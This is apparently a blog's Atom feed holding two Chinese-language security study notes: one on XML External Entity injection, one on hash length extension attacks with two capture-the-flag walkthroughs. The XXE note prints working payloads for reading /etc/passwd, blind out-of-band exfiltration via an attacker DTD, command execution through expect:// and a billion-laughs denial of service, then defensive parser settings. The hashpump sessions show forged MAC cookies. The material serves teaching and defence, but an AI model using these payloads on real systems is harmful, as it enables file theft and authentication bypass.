<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Venture&#39;s Blog</title>
  
  <subtitle>OhiO</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-14T03:33:04.607Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Yu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XML External Entity Injection --笔记</title>
    <link href="http://yoursite.com/2018/08/14/XXE%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/08/14/XXE笔记/</id>
    <published>2018-08-14T02:44:32.742Z</published>
    <updated>2018-08-14T03:33:04.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><p><strong>DTD 引用方式(简要了解)：</strong> </p><p><strong>1.DTD 内部声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</div></pre></td></tr></table></figure><p><strong>2.DTD 外部引用</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM “外部DTD的URI”&gt;</div></pre></td></tr></table></figure><p><strong>3. 引用公共DTD</strong></p><p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; </div><div class="line">&lt;!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN”</div><div class="line">“http://mybatis.org/dtd/mybatis-3-config.dtd”&gt;</div><div class="line">以!DOCTYPE开始,configuration是文档根元素名称；PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；EN表示DTD语言是英语；最后是DTD的URL；</div></pre></td></tr></table></figure><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素 </li><li>属性 </li><li>实体 </li><li>PCDATA  </li><li>CDATA </li></ul><p>重点了解实体</p><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</strong> </p><p><strong>内部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</div></pre></td></tr></table></figure><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;在GET中需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号 </p><p><strong>外部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</div></pre></td></tr></table></figure><p>不同的语言支持的协议不同 </p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180813/6iIjK6JHf4.png?imageslim" alt="mark"></p><p><strong>参数实体声明</strong> </p><p>参数实体实际上不是在具体实例化文档中使用，而是在DTD文档内部被使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 “实体的值”&gt;</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE xee [</div><div class="line">       &lt;!ENTITY % name &quot;XXE&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;/xxe&gt;</div></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1.文件读取"></a>1.文件读取</h3><p>攻击利用大致分两个情形，一种是有回显的情况，一种是无会回显的情况</p><p><strong>有回显：</strong></p><p>1.直接读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">       &lt;!ENTITY b SYSTEM &quot;file:///e://tool/1.txt&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">       &lt;!ENTITY % d SYSTEM &quot;http://localhost/attack1.dtd&quot;&gt;</div><div class="line">%d;]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>的内容为： <code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE a SYSTEM &quot;http://xxx.xxx.xxx/attack.dtd&quot;&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>内容同上不变 </p><p><strong>没有回显</strong></p><p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=e://tool/1.txt&quot;&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/attack.dtd&quot;&gt;</div><div class="line">%dtd;</div><div class="line">%mydata;</div><div class="line">]&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>的内容为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &apos;http://localhost/?%file;&apos;&gt;&quot;</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure><p>最里层的嵌套里必须为字符实体</p><blockquote><p>踩了很多坑，需要注意的是，dtd里的内容url需要添加”;”,最里层的嵌套的%需要为字符实体，需要添加”%all“</p><p>若要读取文件本身包含&lt;等字符，如PHP文件，需要利用php://filter的base64编码绕过 </p></blockquote><p>如果网站开启了报错，也可以直接在报错信息中查看数据</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180813/9AhHCbCeBi.png?imageslim" alt="mark"></p><p>当然可以在apache访问日志中查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /attack.dtd HTTP/1.0&quot; 200 85</div><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /?YWJj HTTP/1.0&quot; 200 1751</div><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /XXE.php HTTP/1.1&quot; 200 1550</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /attack.dtd HTTP/1.0&quot; 200 85</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /?YWJj HTTP/1.0&quot; 200 1751</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /XXE.php HTTP/1.1&quot; 200 1550</div></pre></td></tr></table></figure><h3 id="2-内网信息探测及攻击"><a href="#2-内网信息探测及攻击" class="headerlink" title="2.内网信息探测及攻击"></a>2.内网信息探测及攻击</h3><p>根据不同xml解析器会得到不同的回显报错结果 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><p>结合其他的漏洞比如：struts2 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="3-执行系统命令"><a href="#3-执行系统命令" class="headerlink" title="3.执行系统命令"></a>3.执行系统命令</h3><p>php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="4-DOS攻击"><a href="#4-DOS攻击" class="headerlink" title="4.DOS攻击"></a>4.<strong>DOS攻击</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">   &lt;!DOCTYPE lolz [</div><div class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</div><div class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</div><div class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</div><div class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</div><div class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</div><div class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</div><div class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</div><div class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</div><div class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</div></pre></td></tr></table></figure><h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p><strong>一、禁用外部实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line"></div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure><p><strong>二、尽量不要让用户直接提交XML代码,如果一定要,则需过滤用户提交的XML数据</strong>  </p><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 </p><h2 id="jarvis-oj-API调用"><a href="#jarvis-oj-API调用" class="headerlink" title="jarvis-oj API调用"></a>jarvis-oj API调用</h2><p>Content - Type头限制提交的数据为json，但其实服务器也可以接受其他的数据</p><p>这里就需要去修改Content - Type头为<code>application/xml</code> ，根据提示，读文件/home/ctf/flag.txt，然后POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">       &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;</div><div class="line">]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><p>##参考链接</p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="http://www.4o4notfound.org/index.php/archives/29/" target="_blank" rel="external">http://www.4o4notfound.org/index.php/archives/29/</a></p><p><a href="https://www.hackersb.cn/hacker/211.html" target="_blank" rel="external">https://www.hackersb.cn/hacker/211.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727829287&amp;idx=1&amp;sn=4a68b346b3551c8576faa1834db1ae67&amp;chksm=805088afb72701b95a36dcc993a9fcfee4636b1ed97713a1b6adc66bf355bb3253cb09cc2939&amp;mpshare=1&amp;scene=23&amp;srcid=0812OTnZAKmFxpZZxGIcPhDY#rd" target="_blank" rel="external">jd</a></p><p><a href="https://www.secpulse.com/archives/6256.html" target="_blank" rel="external">https://www.secpulse.com/archives/6256.html</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></p><p><a href="http://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="external">http://www.w3school.com.cn/dtd/index.asp</a></p><p><a href="http://www.freebuf.com/vuls/175451.html" target="_blank" rel="external">http://www.freebuf.com/vuls/175451.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DTD简介&quot;&gt;&lt;a href=&quot;#DTD简介&quot; class=&quot;headerlink&quot; title=&quot;DTD简介&quot;&gt;&lt;/a&gt;DTD简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。&lt;/s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>哈希长度扩展攻击（hash length extension attacks）--笔记</title>
    <link href="http://yoursite.com/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/"/>
    <id>http://yoursite.com/2018/08/14/hash长度扩展/</id>
    <published>2018-08-14T02:44:32.722Z</published>
    <updated>2018-08-14T03:21:12.394Z</updated>
    
    <content type="html"><![CDATA[<p>在密码学和计算机安全中，<strong>长度扩展攻击（Length extension attacks）</strong>是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在<em>消息</em>与<em>密钥</em>的长度已知的情形下，所有采取了 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。注意，由于密钥散列消息认证码（HMAC）并未采取 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 的构造方式，因此不会受到此类攻击的影响（如HMAC-MD5、HMAC-SHA1）。SHA-3算法对此攻击免疫。(源自<a href="https://zh.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB" target="_blank" rel="external">维基百科</a>)</p><p>攻击的要点在于：</p><ul><li>攻击者可以控制message</li><li>攻击者需要知道key的长度，如不知道可以考虑暴力破解</li><li>攻击已经知道了包含key的一个消息的hash值</li><li>hash算法使用了Merkle–Damgård construction进行数据的压缩（比如MD5、SHA-1等）并采取 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 构造</li></ul><p>攻击可以达到的效果在于，如果知道一个原消息哈希值H(key∥M1)及其(key∥M1)长度，对于任意的字符串M2，攻击者可以计算出H(pad(key∥M1) + M2)的值，而不需要知道是key及M1是多少 </p><p>原因在于基于Merkle–Damgård构造哈希函数有类似的特点：</p><p>以区块为单位操作数据（MD5, SHA1, SHA256的区块长度是512 bits，大多数message的长度不会刚好可以被哈希函数的区块长度整除。这样一来，message就必须被填充(padding)至区块长度的整数倍） </p><p>每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量 ，初始化向量是定义好的，在最后一块的时候，才会将其对应的链接变量转换为hash值。 </p><p>由已知的MD5值逆向得到对应的链接变量，利用得到的链接变量对填充后的新加的消息进行哈希算法，最后得到hash值。（具体算法：<a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html）" target="_blank" rel="external">http://blog.chinaunix.net/uid-27070210-id-3255947.html）</a></p><p>如何去防止攻击？使用HMAC可以有效避免攻击；另外针对Flickr API等将参数签名的应用来说，secret放置在 参数末尾也能防止这种攻击。 比如 MD5(m+secret)，希望推导出 MD5(m+secret||padding||m’)，结果由于自动附加secret在末尾的关系，会变成MD5(m||padding||m’||secret)，从而导致Length Extension run不起来。</p><p>工具可以采用的有<strong><a href="https://github.com/bwall/HashPump" target="_blank" rel="external">HashPump</a></strong> 及<strong><a href="https://github.com/amlweems/hexpand" target="_blank" rel="external">hexpand</a></strong> ，不同在于HashPump需要提供原始消息数据，而hexpand则不需要</p><hr><p>下面以两个CTF题为例：</p><p><strong><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">实验吧-让我进去</a></strong></p><p>首先burpsuit抓包查看，特别的地方在于cookie前两个字段</p><p><code>sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0;</code></p><p>尝试修改source字段为1，返回了原代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</div><div class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</div><div class="line"></div><div class="line">$username = $_POST[&quot;username&quot;];</div><div class="line">$password = $_POST[&quot;password&quot;];</div><div class="line"></div><div class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</div><div class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</div><div class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</div><div class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</div><div class="line">            die (&quot;The flag is &quot;. $flag);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</div><div class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</div><div class="line">        echo &quot;&quot;; // This source code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>分析源码可以知道，sample-hash字段为进过MD5加密的字符串”adminadmin”加未知的secret,只知道secret长度为15。要得到flag，需要getmein字段的值为进过MD5加密的输入的username和password加secret的值。并且固定了username为admin,password不能为admin。</p><p>这里就用到哈希长度拓展攻击，目前我们知道字符串secret+adminadmin的MD5hash值，secret的长度为15，我们需要添加一个字符串M2，构造字符串为secret+admin+M2，并计算出其MD5值</p><p>这里使用hashpump,附加数据至少1位以上 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~/HashPump# hashpump</div><div class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</div><div class="line">Input Data: admin</div><div class="line">Input Key Length: 20</div><div class="line">Input Data to Add: venture</div><div class="line">57545bbf734b02db716893eefe9899ad</div><div class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00venture</div></pre></td></tr></table></figure><p>抓包添加cookie字段getmein，对password反urldecode一下,16进制urlencode即将\x换成% </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getmein=57545bbf734b02db716893eefe9899ad</div><div class="line"></div><div class="line">username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00venture</div></pre></td></tr></table></figure><p>就可以得到flag</p><p><strong><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">Jarvis OJ-flag在管理员手里</a> </strong></p><p>index.php~源码泄露 ,查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">    body &#123;</div><div class="line">        background:gray;</div><div class="line">        text-align:center;</div><div class="line">    &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">    &lt;?php</div><div class="line">        $auth = false;</div><div class="line">        $role = &quot;guest&quot;;</div><div class="line">        $salt =</div><div class="line">        if (isset($_COOKIE[&quot;role&quot;])) &#123;</div><div class="line">            $role = unserialize($_COOKIE[&quot;role&quot;]);</div><div class="line">            $hsh = $_COOKIE[&quot;hsh&quot;];</div><div class="line">            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123;</div><div class="line">                $auth = true;</div><div class="line">            &#125; else &#123;</div><div class="line">                $auth = false;</div><div class="line">            &#125;</div><div class="line">        &#125; else &#123;</div><div class="line">            $s = serialize($role);</div><div class="line">            setcookie(&apos;role&apos;,$s);</div><div class="line">            $hsh = md5($salt.strrev($s));</div><div class="line">            setcookie(&apos;hsh&apos;,$hsh);</div><div class="line">        &#125;</div><div class="line">        if ($auth) &#123;</div><div class="line">            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is</div><div class="line">        &#125; else &#123;</div><div class="line">            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">    ?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p>这里反序列化在php版本低的时候可以使用%00截断 ，所以反序之后原本添加在后的admin成为首部，之后的部分被00截断</p><p>这里知道原数据：;”tseug”:5:s  ；原hash值：3a4727d57463f122833d9e732f94e4e0；但salt长度未知需要爆破</p><p>需要添加的内容：;”nimda”:5:s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# hashpump</div><div class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</div><div class="line">Input Data: ;&quot;tseug&quot;:5:s</div><div class="line">Input Key Length: 11</div><div class="line">Input Data to Add: ;&quot;nimda&quot;:5:s</div><div class="line">fcdc3840332555511c4e4323f6decb07</div><div class="line">;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s</div></pre></td></tr></table></figure><p>还需要反序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">role = s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
